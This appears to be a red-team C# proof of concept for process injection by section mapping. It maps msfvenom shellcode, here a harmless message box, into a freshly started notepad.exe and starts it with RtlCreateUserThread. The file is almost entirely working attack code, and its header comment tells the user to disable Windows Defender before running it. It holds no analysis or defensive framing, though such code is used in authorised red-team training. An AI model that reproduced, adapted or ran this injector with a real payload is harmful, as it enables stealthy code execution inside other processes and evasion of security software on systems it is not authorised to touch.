using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

// 1. Turn off defender 
// 2. Use cmd/powershell/terminal to execute this. Don't execute inside visual studio!

namespace MappingInjection
{
    class Program
    {
        static void Main(string[] args)
        {
            // msfvenom -p windows/x64/messagebox text="stage0 shellcode" title="choi redteam playbook" -f csharp
            byte[] buf = new byte[306] {
                0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,
                0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,
                0x8b,0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,0x50,0x3e,0x48,
                0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,
                0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,
                0x48,0x8b,0x52,0x20,0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,
                0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,0x3e,0x8b,0x48,
                0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x5c,0x48,0xff,0xc9,0x3e,
                0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,
                0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,
                0x08,0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
                0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x3e,
                0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,
                0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
                0x59,0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,0x49,0xc7,0xc1,
                0x00,0x00,0x00,0x00,0x3e,0x48,0x8d,0x95,0xfe,0x00,0x00,0x00,0x3e,0x4c,0x8d,
                0x85,0x0f,0x01,0x00,0x00,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,
                0xd5,0x48,0x31,0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x73,0x74,0x61,
                0x67,0x65,0x30,0x20,0x73,0x68,0x65,0x6c,0x6c,0x63,0x6f,0x64,0x65,0x00,0x63,
                0x68,0x6f,0x69,0x20,0x72,0x65,0x64,0x74,0x65,0x61,0x6d,0x20,0x70,0x6c,0x61,
                0x79,0x62,0x6f,0x6f,0x6b,0x00 };

            var process = Process.Start(@"C:\windows\system32\notepad.exe");
            var pid = process.Id;
            uint bufLength = (uint)buf.Length;

            uint SEC_COMMIT = 0x8000000;
            uint SECTION_ALL_ACCESS = (0x0002 | 0x0004 | 0x0008);

            IntPtr hSection = IntPtr.Zero;
            IntPtr pLocalView = IntPtr.Zero;
            IntPtr pRemoteView = IntPtr.Zero;
            IntPtr cid = IntPtr.Zero;

            // 1. Create section in current process 
            UInt32 rCreateSection = NtCreateSection(
                ref hSection, 
                SECTION_ALL_ACCESS,
                IntPtr.Zero,
                ref bufLength,
                (uint)MemoryProtection.ExecuteReadWrite,
                SEC_COMMIT,
                IntPtr.Zero
                );

            // 2. Create view to access the section created above.
            uint rMVOS = NtMapViewOfSection(
                hSection,
                GetCurrentProcess(),
                ref pLocalView,
                IntPtr.Zero,    
                IntPtr.Zero,
                out ulong sectionOffset,
                out bufLength,
                2,          // ViewUnmap = 2 
                0,
                (uint)MemoryProtection.ReadWrite
                );

            // 3. Copy shellcode to the local view 
            Marshal.Copy(buf, 0, pLocalView, buf.Length);

            // Notepad's Process Handle 
            IntPtr hProc = OpenProcess((uint)ProcessAccessFlags.All, false, pid);

            // 4. Create view to remote process. 
            uint rNMVOS = NtMapViewOfSection(
                hSection,
                hProc,
                ref pRemoteView,
                IntPtr.Zero,
                IntPtr.Zero,
                out ulong rSectionOffset,
                out bufLength,
                2,
                0,
                (uint)MemoryProtection.ExecuteRead
                );

            // 5. Start thread on the remote view to trigger the shellcode 
            IntPtr hThread = IntPtr.Zero;
            IntPtr pThread = RtlCreateUserThread(hProc, IntPtr.Zero, false, 0, IntPtr.Zero, IntPtr.Zero, pRemoteView, IntPtr.Zero, ref hThread, IntPtr.Zero);

            Console.WriteLine("[+] Local View address in MappingInejction.exe = 0x{0}", pLocalView.ToInt64().ToString("x2"));
            Console.WriteLine("[+] Remote View address in Notepad.exe = 0x{0}", pRemoteView.ToInt64().ToString("x2"));

        }

        //  ============================ PInvoke - Ignore me ============================
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(
           uint processAccess,
           bool bInheritHandle,
           int processId
       );
        [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
        static extern UInt32 NtCreateSection(
            ref IntPtr SectionHandle,
            UInt32 DesiredAccess,
            IntPtr ObjectAttributes,
            ref UInt32 MaximumSize,
            UInt32 SectionPageProtection,
            UInt32 AllocationAttributes,
            IntPtr FileHandle
        );

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtMapViewOfSection(
            IntPtr SectionHandle,
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            IntPtr CommitSize,
            out ulong SectionOffset,
            out uint ViewSize,
            uint InheritDisposition,
            uint AllocationType,
            uint Win32Protect
        );

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern IntPtr RtlCreateUserThread(
            IntPtr processHandle,
            IntPtr threadSecurity,
            bool createSuspended,
            Int32 stackZeroBits,
            IntPtr stackReserved,
            IntPtr stackCommit,
            IntPtr startAddress,
            IntPtr parameter,
            ref IntPtr threadHandle,
            IntPtr clientId
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetCurrentProcess();

        [DllImport("msvcrt.dll", EntryPoint = "memcpy", CallingConvention = CallingConvention.Cdecl, SetLastError = false)]
        public static extern IntPtr memcpy(
            IntPtr dest,
            IntPtr src,
            UIntPtr count
        );

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(
            IntPtr hProcess, 
            IntPtr lpThreadAttributes, 
            uint dwStackSize, 
            IntPtr lpStartAddress, 
            IntPtr lpParameter, 
            uint dwCreationFlags, 
            out IntPtr lpThreadId
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern UInt32 WaitForSingleObject(
            IntPtr hHandle,
            UInt32 dwMilliseconds
        );

        [Flags]
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }

        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            LargePages = 0x20000000
        }

        [Flags]
        public enum MemoryProtection
        {
            Execute = 0x10,
            ExecuteRead = 0x20,
            ExecuteReadWrite = 0x40,
            ExecuteWriteCopy = 0x80,
            NoAccess = 0x01,
            ReadOnly = 0x02,
            ReadWrite = 0x04,
            WriteCopy = 0x08,
            GuardModifierflag = 0x100,
            NoCacheModifierflag = 0x200,
            WriteCombineModifierflag = 0x400
        }


    }
}
